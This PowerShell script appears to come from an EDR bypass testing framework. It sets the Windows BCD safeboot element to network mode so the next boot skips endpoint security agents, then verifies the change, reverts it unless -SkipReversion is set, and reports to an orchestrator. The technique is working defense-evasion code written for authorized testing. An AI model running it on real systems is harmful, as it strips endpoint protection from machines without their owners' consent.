#==============================================================================
# BP1000.3 - Safe Mode Boot Bypass via PowerShell BCD Cmdlets
# EDR Bypass Testing Automation Framework
#==============================================================================
# SYNOPSIS
#   Performs EDR bypass by configuring system to boot into Safe Mode with Network
#   using PowerShell BCD cmdlets (Set-BcdElement), then reverts the configuration 
#   after verification.
#
# DESCRIPTION
#   This script implements BP-1000.3 technique which uses PowerShell BCD cmdlets
#   introduced in Windows 11 21H2 to set the system to boot into Safe Mode with 
#   Network on next restart. Most EDR agents do not load in Safe Mode, effectively 
#   bypassing their protection.
#   
#   Test Flow:
#   1. Verify Windows 11 21H2+ compatibility
#   2. Backup current boot configuration
#   3. Execute bypass: Set-BcdElement safeboot -Type Integer Value 1
#   4. Verify bypass was applied successfully
#   5. Revert configuration: Remove-BcdElement safeboot -Force
#   6. Verify reversion was successful
#   7. Report results to orchestrator
#
# REQUIREMENTS
#   - Administrative privileges (required for BCD operations)
#   - Windows 11 21H2 or later (build 22000+)
#   - PowerShell 5.1 or later with BCD cmdlets
#
# EXIT CODES
#   0 = Success (bypass applied and reverted successfully)
#   1 = General failure
#   2 = Insufficient privileges
#   3 = Bypass application failed
#   4 = Bypass verification failed
#   5 = Reversion failed
#   6 = Unsupported Windows version
#   7 = BCD cmdlets not available
#==============================================================================

[CmdletBinding()]
param(
    [Parameter(Mandatory=$false)]
    [string]$LogPath = "C:\EDRBypassTests\Logs",
    
    [Parameter(Mandatory=$false)]
    [switch]$SkipReversion = $false,
    
    [Parameter(Mandatory=$false)]
    [switch]$Verbose = $false
)

# Set strict mode for better error handling
Set-StrictMode -Version Latest
$ErrorActionPreference = "Stop"

#region Constants and Configuration
$TECHNIQUE_ID = "BP1000.3"
$TECHNIQUE_NAME = "Safe Mode Boot via PowerShell BCD Cmdlets"
$SCRIPT_VERSION = "1.0.0"
$TIMESTAMP = Get-Date -Format "yyyyMMdd_HHmmss"
$SCRIPT_NAME = "BP1000.3-powershell"

# Result constants for orchestrator communication
$RESULT_SUCCESS = "BYPASSED"
$RESULT_FAILURE = "FAILED"
$RESULT_DETECTED = "DETECTED"
$RESULT_ERROR = "ERROR"

# BCD constants
$BCD_SAFEBOOT_NETWORK_VALUE = 1  # Integer value for network safe boot
$BCD_ELEMENT_SAFEBOOT = "safeboot"

# Windows version requirements
$MIN_WINDOWS_BUILD = 22000  # Windows 11 21H2
#endregion

#region Logging Functions
function Initialize-Logging {
    param([string]$LogDirectory)
    
    try {
        if (-not (Test-Path $LogDirectory)) {
            New-Item -Path $LogDirectory -ItemType Directory -Force | Out-Null
        }
        
        $global:LogFile = Join-Path $LogDirectory "$SCRIPT_NAME`_$TIMESTAMP.log"
        $global:ResultFile = Join-Path $LogDirectory "$SCRIPT_NAME`_$TIMESTAMP`_result.json"
        
        Write-Log "=== EDR Bypass Test: $TECHNIQUE_NAME ===" -Level "INFO"
        Write-Log "Technique ID: $TECHNIQUE_ID" -Level "INFO"
        Write-Log "Script Version: $SCRIPT_VERSION" -Level "INFO"
        Write-Log "Start Time: $(Get-Date -Format 'yyyy-MM-dd HH:mm:ss')" -Level "INFO"
        Write-Log "Log File: $global:LogFile" -Level "INFO"
        Write-Log "Result File: $global:ResultFile" -Level "INFO"
        
        return $true
    }
    catch {
        Write-Error "Failed to initialize logging: $($_.Exception.Message)"
        return $false
    }
}

function Write-Log {
    param(
        [string]$Message,
        [ValidateSet("INFO", "WARN", "ERROR", "DEBUG")]
        [string]$Level = "INFO"
    )
    
    $logEntry = "$(Get-Date -Format 'yyyy-MM-dd HH:mm:ss') [$Level] $Message"
    
    # Write to console
    switch ($Level) {
        "ERROR" { Write-Host $logEntry -ForegroundColor Red }
        "WARN"  { Write-Host $logEntry -ForegroundColor Yellow }
        "DEBUG" { if ($Verbose) { Write-Host $logEntry -ForegroundColor Gray } }
        default { Write-Host $logEntry }
    }
    
    # Write to file if available
    if ($global:LogFile) {
        try {
            Add-Content -Path $global:LogFile -Value $logEntry -Encoding UTF8
        }
        catch {
            Write-Warning "Failed to write to log file: $($_.Exception.Message)"
        }
    }
}
#endregion

#region Utility Functions
function Test-AdminPrivileges {
    try {
        $currentPrincipal = New-Object Security.Principal.WindowsPrincipal([Security.Principal.WindowsIdentity]::GetCurrent())
        $isAdmin = $currentPrincipal.IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)
        Write-Log "Administrator privileges check: $isAdmin" -Level "DEBUG"
        return $isAdmin
    }
    catch {
        Write-Log "Failed to check administrator privileges: $($_.Exception.Message)" -Level "ERROR"
        return $false
    }
}

function Test-WindowsVersion {
    try {
        $osInfo = Get-WmiObject -Class Win32_OperatingSystem
        $buildNumber = [int]$osInfo.BuildNumber
        $version = $osInfo.Version
        $caption = $osInfo.Caption
        
        Write-Log "Operating System: $caption" -Level "DEBUG"
        Write-Log "Version: $version" -Level "DEBUG"
        Write-Log "Build Number: $buildNumber" -Level "DEBUG"
        Write-Log "Minimum Required Build: $MIN_WINDOWS_BUILD (Windows 11 21H2)" -Level "DEBUG"
        
        $global:SystemInfo = @{
            Caption = $caption
            Version = $version
            BuildNumber = $buildNumber
            IsSupported = $buildNumber -ge $MIN_WINDOWS_BUILD
        }
        
        if ($buildNumber -ge $MIN_WINDOWS_BUILD) {
            Write-Log "Windows version check passed - Build $buildNumber >= $MIN_WINDOWS_BUILD" -Level "INFO"
            return $true
        }
        else {
            Write-Log "Windows version check failed - Build $buildNumber < $MIN_WINDOWS_BUILD" -Level "ERROR"
            Write-Log "This technique requires Windows 11 21H2 or later" -Level "ERROR"
            return $false
        }
    }
    catch {
        Write-Log "Failed to check Windows version: $($_.Exception.Message)" -Level "ERROR"
        return $false
    }
}

function Test-BcdCmdletAvailability {
    try {
        Write-Log "Testing BCD cmdlet availability..." -Level "DEBUG"
        
        # Test if Set-BcdElement cmdlet is available
        $setBcdCmd = Get-Command "Set-BcdElement" -ErrorAction SilentlyContinue
        $removeBcdCmd = Get-Command "Remove-BcdElement" -ErrorAction SilentlyContinue
        
        if ($setBcdCmd -and $removeBcdCmd) {
            Write-Log "BCD cmdlets are available and accessible" -Level "DEBUG"
            Write-Log "Set-BcdElement: $($setBcdCmd.Source)" -Level "DEBUG"
            Write-Log "Remove-BcdElement: $($removeBcdCmd.Source)" -Level "DEBUG"
            return $true
        }
        else {
            Write-Log "BCD cmdlets are not available" -Level "ERROR"
            if (-not $setBcdCmd) {
                Write-Log "Set-BcdElement cmdlet not found" -Level "ERROR"
            }
            if (-not $removeBcdCmd) {
                Write-Log "Remove-BcdElement cmdlet not found" -Level "ERROR"
            }
            return $false
        }
    }
    catch {
        Write-Log "Failed to test BCD cmdlet availability: $($_.Exception.Message)" -Level "ERROR"
        return $false
    }
}

function Get-BcdSafebootValue {
    try {
        Write-Log "Querying current BCD safeboot configuration using PowerShell cmdlets..." -Level "DEBUG"
        
        # Use Get-BcdElement to check current safeboot value
        $safebootElement = Get-BcdElement -Element $BCD_ELEMENT_SAFEBOOT -ErrorAction SilentlyContinue
        
        if ($safebootElement) {
            $value = $safebootElement.Integer
            Write-Log "Current safeboot value: $value" -Level "DEBUG"
            
            # Convert integer value to descriptive text
            switch ($value) {
                0 { $description = "minimal"; break }
                1 { $description = "network"; break }
                2 { $description = "dsrepair"; break }
                default { $description = "unknown($value)"; break }
            }
            
            Write-Log "Safeboot mode description: $description" -Level "DEBUG"
            return @{
                Value = $value
                Description = $description
            }
        }
        else {
            Write-Log "No safeboot value currently set" -Level "DEBUG"
            return $null
        }
    }
    catch {
        Write-Log "Failed to query BCD safeboot value: $($_.Exception.Message)" -Level "ERROR"
        throw
    }
}

function Test-BcdToolAvailability {
    try {
        Write-Log "Testing bcdedit tool availability (fallback verification)..." -Level "DEBUG"
        
        $testOutput = & bcdedit /? 2>&1
        if ($LASTEXITCODE -eq 0) {
            Write-Log "bcdedit tool is available for verification" -Level "DEBUG"
            return $true
        }
        else {
            Write-Log "bcdedit tool returned error code: $LASTEXITCODE" -Level "DEBUG"
            return $false
        }
    }
    catch {
        Write-Log "bcdedit tool is not available: $($_.Exception.Message)" -Level "DEBUG"
        return $false
    }
}
#endregion

#region Test Result Functions
function Write-TestResult {
    param(
        [string]$Status,
        [string]$Message,
        [hashtable]$Details = @{}
    )
    
    $result = @{
        TechniqueId = $TECHNIQUE_ID
        TechniqueName = $TECHNIQUE_NAME
        Status = $Status
        Message = $Message
        Timestamp = (Get-Date -Format 'yyyy-MM-dd HH:mm:ss')
        Details = $Details
        ScriptVersion = $SCRIPT_VERSION
    }
    
    try {
        $resultJson = $result | ConvertTo-Json -Depth 3
        if ($global:ResultFile) {
            Set-Content -Path $global:ResultFile -Value $resultJson -Encoding UTF8
        }
        
        Write-Log "=== TEST RESULT ===" -Level "INFO"
        Write-Log "Status: $Status" -Level "INFO"
        Write-Log "Message: $Message" -Level "INFO"
        Write-Log "Result file: $global:ResultFile" -Level "INFO"
        
        # Output for orchestrator pickup
        Write-Output "TECHNIQUE_RESULT:$Status|$Message"
        
    }
    catch {
        Write-Log "Failed to write test result: $($_.Exception.Message)" -Level "ERROR"
    }
}
#endregion

#region Main Test Functions
function Backup-OriginalState {
    try {
        Write-Log "Backing up original BCD safeboot configuration..." -Level "INFO"
        
        $originalValue = Get-BcdSafebootValue
        
        $global:OriginalState = @{
            SafebootElement = $originalValue
            BackupTime = Get-Date
        }
        
        if ($originalValue) {
            Write-Log "Original safeboot element backed up: Value=$($originalValue.Value), Description=$($originalValue.Description)" -Level "INFO"
        }
        else {
            Write-Log "No original safeboot element to backup (normal boot)" -Level "INFO"
        }
        
        return $true
    }
    catch {
        Write-Log "Failed to backup original state: $($_.Exception.Message)" -Level "ERROR"
        return $false
    }
}

function Invoke-BypassTechnique {
    try {
        Write-Log "Executing BP1000.3 bypass technique..." -Level "INFO"
        Write-Log "Command: Set-BcdElement safeboot -Type Integer Value $BCD_SAFEBOOT_NETWORK_VALUE" -Level "INFO"
        
        # Execute the bypass command using PowerShell BCD cmdlet
        Set-BcdElement -Element $BCD_ELEMENT_SAFEBOOT -Type Integer -Value $BCD_SAFEBOOT_NETWORK_VALUE
        
        Write-Log "PowerShell BCD cmdlet executed successfully" -Level "INFO"
        return $true
    }
    catch {
        Write-Log "Failed to execute bypass technique: $($_.Exception.Message)" -Level "ERROR"
        Write-Log "Error details: $($_.Exception.GetType().Name)" -Level "ERROR"
        if ($_.Exception.InnerException) {
            Write-Log "Inner exception: $($_.Exception.InnerException.Message)" -Level "ERROR"
        }
        return $false
    }
}

function Test-BypassSuccess {
    try {
        Write-Log "Verifying bypass was applied successfully..." -Level "INFO"
        
        # Small delay to ensure BCD changes are persisted
        Start-Sleep -Milliseconds 500
        
        $currentValue = Get-BcdSafebootValue
        
        if ($currentValue -and $currentValue.Value -eq $BCD_SAFEBOOT_NETWORK_VALUE) {
            Write-Log "Bypass verification successful - safeboot set to: Value=$($currentValue.Value), Description=$($currentValue.Description)" -Level "INFO"
            return $true
        }
        else {
            $actualValue = if ($currentValue) { $currentValue.Value } else { "null" }
            Write-Log "Bypass verification failed - expected '$BCD_SAFEBOOT_NETWORK_VALUE', got '$actualValue'" -Level "ERROR"
            return $false
        }
    }
    catch {
        Write-Log "Failed to verify bypass success: $($_.Exception.Message)" -Level "ERROR"
        return $false
    }
}

function Invoke-StateReversion {
    try {
        Write-Log "Reverting system to original state using PowerShell BCD cmdlets..." -Level "INFO"
        
        if ($global:OriginalState.SafebootElement) {
            # Restore original safeboot value
            $originalValue = $global:OriginalState.SafebootElement.Value
            Write-Log "Restoring original safeboot value: $originalValue" -Level "INFO"
            Set-BcdElement -Element $BCD_ELEMENT_SAFEBOOT -Type Integer -Value $originalValue
        }
        else {
            # Remove safeboot element to restore normal boot
            Write-Log "Removing safeboot element to restore normal boot" -Level "INFO"
            Remove-BcdElement -Element $BCD_ELEMENT_SAFEBOOT -Force
        }
        
        Write-Log "State reversion command executed successfully" -Level "INFO"
        return $true
    }
    catch {
        Write-Log "Failed to revert system state: $($_.Exception.Message)" -Level "ERROR"
        Write-Log "Error details: $($_.Exception.GetType().Name)" -Level "ERROR"
        if ($_.Exception.InnerException) {
            Write-Log "Inner exception: $($_.Exception.InnerException.Message)" -Level "ERROR"
        }
        return $false
    }
}

function Test-ReversionSuccess {
    try {
        Write-Log "Verifying state reversion was successful..." -Level "INFO"
        
        # Small delay to ensure BCD changes are persisted
        Start-Sleep -Milliseconds 500
        
        $currentValue = Get-BcdSafebootValue
        $expectedValue = $global:OriginalState.SafebootElement
        
        # Compare current state with expected state
        if ((-not $currentValue -and -not $expectedValue) -or 
            ($currentValue -and $expectedValue -and $currentValue.Value -eq $expectedValue.Value)) {
            
            $currentDesc = if ($currentValue) { "$($currentValue.Value) ($($currentValue.Description))" } else { "null" }
            Write-Log "Reversion verification successful - safeboot value restored to: $currentDesc" -Level "INFO"
            return $true
        }
        else {
            $currentDesc = if ($currentValue) { "$($currentValue.Value) ($($currentValue.Description))" } else { "null" }
            $expectedDesc = if ($expectedValue) { "$($expectedValue.Value) ($($expectedValue.Description))" } else { "null" }
            Write-Log "Reversion verification failed - expected '$expectedDesc', got '$currentDesc'" -Level "ERROR"
            return $false
        }
    }
    catch {
        Write-Log "Failed to verify reversion success: $($_.Exception.Message)" -Level "ERROR"
        return $false
    }
}
#endregion

#region Main Execution
function main {
    try {
        Write-Host "Starting EDR Bypass Test: $TECHNIQUE_NAME" -ForegroundColor Cyan
        
        # Initialize logging
        if (-not (Initialize-Logging -LogDirectory $LogPath)) {
            Write-Error "Failed to initialize logging system"
            exit 1
        }
        
        Write-Log "=== PRE-EXECUTION CHECKS ===" -Level "INFO"
        
        # Check Windows version compatibility
        if (-not (Test-WindowsVersion)) {
            $errorMsg = "Unsupported Windows version - requires Windows 11 21H2 or later (build $MIN_WINDOWS_BUILD+)"
            Write-Log $errorMsg -Level "ERROR"
            Write-TestResult -Status $RESULT_ERROR -Message $errorMsg -Details @{
                SystemInfo = $global:SystemInfo
                RequiredBuild = $MIN_WINDOWS_BUILD
            }
            exit 6
        }
        Write-Log "Windows version compatibility confirmed" -Level "INFO"
        
        # Check administrative privileges
        if (-not (Test-AdminPrivileges)) {
            $errorMsg = "Administrative privileges required for BCD operations"
            Write-Log $errorMsg -Level "ERROR"
            Write-TestResult -Status $RESULT_ERROR -Message $errorMsg
            exit 2
        }
        Write-Log "Administrative privileges confirmed" -Level "INFO"
        
        # Check BCD cmdlet availability
        if (-not (Test-BcdCmdletAvailability)) {
            $errorMsg = "PowerShell BCD cmdlets are not available"
            Write-Log $errorMsg -Level "ERROR"
            Write-TestResult -Status $RESULT_ERROR -Message $errorMsg -Details @{
                SystemInfo = $global:SystemInfo
                PowerShellVersion = $PSVersionTable.PSVersion.ToString()
            }
            exit 7
        }
        Write-Log "PowerShell BCD cmdlets availability confirmed" -Level "INFO"
        
        # Check bcdedit availability (for verification purposes)
        $bcdEditAvailable = Test-BcdToolAvailability
        if ($bcdEditAvailable) {
            Write-Log "bcdedit tool available for verification" -Level "DEBUG"
        }
        else {
            Write-Log "bcdedit tool not available - using PowerShell cmdlets only" -Level "DEBUG"
        }
        
        Write-Log "=== EXECUTING BYPASS TECHNIQUE ===" -Level "INFO"
        
        # Backup original state
        if (-not (Backup-OriginalState)) {
            $errorMsg = "Failed to backup original system state"
            Write-Log $errorMsg -Level "ERROR"
            Write-TestResult -Status $RESULT_ERROR -Message $errorMsg
            exit 1
        }
        
        # Execute bypass technique
        if (-not (Invoke-BypassTechnique)) {
            $errorMsg = "Failed to execute PowerShell BCD bypass technique"
            Write-Log $errorMsg -Level "ERROR"
            Write-TestResult -Status $RESULT_FAILURE -Message $errorMsg
            exit 3
        }
        
        # Verify bypass was applied
        if (-not (Test-BypassSuccess)) {
            $errorMsg = "Bypass technique failed verification"
            Write-Log $errorMsg -Level "ERROR"
            Write-TestResult -Status $RESULT_FAILURE -Message $errorMsg
            exit 4
        }
        
        Write-Log "=== BYPASS TECHNIQUE SUCCESSFUL ===" -Level "INFO"
        
        # Revert state unless explicitly skipped
        if (-not $SkipReversion) {
            Write-Log "=== REVERTING SYSTEM STATE ===" -Level "INFO"
            
            if (-not (Invoke-StateReversion)) {
                $errorMsg = "Failed to revert system state"
                Write-Log $errorMsg -Level "ERROR"
                Write-TestResult -Status $RESULT_ERROR -Message $errorMsg -Details @{
                    BypassSuccessful = $true
                    ReversionFailed = $true
                }
                exit 5
            }
            
            if (-not (Test-ReversionSuccess)) {
                $errorMsg = "State reversion failed verification"
                Write-Log $errorMsg -Level "ERROR"
                Write-TestResult -Status $RESULT_ERROR -Message $errorMsg -Details @{
                    BypassSuccessful = $true
                    ReversionFailed = $true
                }
                exit 5
            }
            
            Write-Log "System state successfully reverted" -Level "INFO"
        }
        else {
            Write-Log "State reversion skipped as requested" -Level "WARN"
        }
        
        # Report success
        $successMsg = "BP1000.3 PowerShell BCD bypass technique executed and verified successfully"
        Write-Log $successMsg -Level "INFO"
        Write-TestResult -Status $RESULT_SUCCESS -Message $successMsg -Details @{
            OriginalSafebootElement = $global:OriginalState.SafebootElement
            BypassApplied = $true
            BypassVerified = $true
            StateReverted = (-not $SkipReversion)
            SystemInfo = $global:SystemInfo
            PowerShellVersion = $PSVersionTable.PSVersion.ToString()
            BcdEditAvailable = $bcdEditAvailable
        }
        
        Write-Log "=== TEST COMPLETED SUCCESSFULLY ===" -Level "INFO"
        Write-Log "End Time: $(Get-Date -Format 'yyyy-MM-dd HH:mm:ss')" -Level "INFO"
        
        exit 0
        
    }
    catch {
        $errorMsg = "Unhandled exception in main execution: $($_.Exception.Message)"
        Write-Log $errorMsg -Level "ERROR"
        Write-Log "Stack trace: $($_.ScriptStackTrace)" -Level "ERROR"
        Write-TestResult -Status $RESULT_ERROR -Message $errorMsg
        exit 1
    }
}

# Execute main function
main
#endregion